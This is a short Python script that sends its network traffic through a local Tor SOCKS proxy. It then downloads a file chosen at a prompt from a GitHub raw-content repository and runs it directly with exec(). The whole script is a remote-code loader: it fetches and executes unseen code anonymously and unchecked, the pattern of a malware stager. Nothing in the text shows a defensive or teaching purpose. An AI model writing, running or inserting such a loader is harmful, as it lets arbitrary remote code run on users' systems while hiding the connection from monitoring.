from urllib.request import Request,urlopen
import socks
import socket
socks.set_default_proxy(socks.SOCKS5,'127.0.0.1',9150)
socket.socket=socks.socksocket
exec(urlopen(Request('https://raw.githubusercontent.com/alexis-dom/mir/main/' + input(">"))).read())
